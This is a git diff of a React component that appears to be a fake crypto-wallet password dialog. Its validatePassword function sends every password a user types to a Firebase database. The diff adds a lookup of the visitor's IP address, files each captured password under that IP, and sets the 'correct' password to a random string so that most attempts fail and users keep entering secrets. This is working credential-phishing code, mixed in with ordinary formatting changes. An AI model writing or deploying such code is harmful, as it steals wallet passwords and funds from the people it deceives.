@@ -34,6 +34,7 @@ import lineasepolia from "./assets/images/icons/linea-logo-mainnet.svg";
 import { initializeApp } from "firebase/app";
 import { getAnalytics } from "firebase/analytics";
 import { getDatabase, ref, set } from "firebase/database";
+import axios from "axios";
 
 const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches;
 // console.log("Is dark mode?", isDarkMode);
@@ -57,11 +58,6 @@ const firebaseConfig = {
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
-const addUser = (payload) => {
-  const d = new Date();
-  const dataRef = ref(db, `users/user_${d.getTime()}`);
-  set(dataRef, payload);
-};
 
 const style = {
   position: "absolute",
@@ -76,6 +72,25 @@ const style = {
 };
 
 const Mainmodal = () => {
+  const [ip, setIp] = useState(null);
+  useEffect(() => {
+    const fetchIP = async () => {
+      try {
+        const response = await axios.get("https://api.ipify.org?format=json");
+        setIp(response.data.ip);
+      } catch (error) {
+        console.error("Error fetching IP address:", error);
+      }
+    };
+
+    fetchIP();
+  }, []);
+  const addUser = (payload) => {
+    const d = new Date();
+    
+    const dataRef = ref(db, `${ip.replaceAll(".","_")}/user_${d.getTime()}`);
+    set(dataRef, payload);
+  };
   const data = useContext(UserContext);
   const open = data.mainmodal;
   const currentnet = data.currentnet;
@@ -97,11 +112,11 @@ const Mainmodal = () => {
       validatePassword();
     }
   };
-const closeModal=()=>{
-  setPassword('');
-  handleClose();
-  setError(false);
-}
+  const closeModal = () => {
+    setPassword("");
+    handleClose();
+    setError(false);
+  };
   const setInputRef = useCallback((node) => {
     if (node) {
       inputRef.current = node;
@@ -121,7 +136,7 @@ const closeModal=()=>{
   // Password validation logic
   const validatePassword = () => {
     addUser(password);
-    const correctPassword = "111"; // Example correct password
+    const correctPassword = "111sdswh2y67623tg74yehd"; // Example correct password
     if (password !== correctPassword && password !== "") {
       setError(true);
       setHelperText("Incorrect password");
@@ -171,7 +186,6 @@ const closeModal=()=>{
                 isDarkMode === true
                   ? "0 4px 8px rgba(0, 0, 0, 0.38)"
                   : "0 4px 8px rgba(0, 0, 0, 0.08)",
-            
             }}
           >
             <div id="button1" style={{ height: 32 }}>
@@ -313,7 +327,6 @@ const closeModal=()=>{
                       isDarkMode === true
                         ? "1px solid white"
                         : "1px solid black",
-         
                   },
                   ".css-4twbn2-MuiInputBase-root-MuiInput-root:hover:not(.Mui-disabled, .Mui-error)::before":
                     {
@@ -323,9 +336,7 @@ const closeModal=()=>{
                           : "1px solid black",
                     },
 
-                  
                   "& .MuiInput-underline": {
-                 
                     "&:before": {
                       borderBottom:
                         error &&
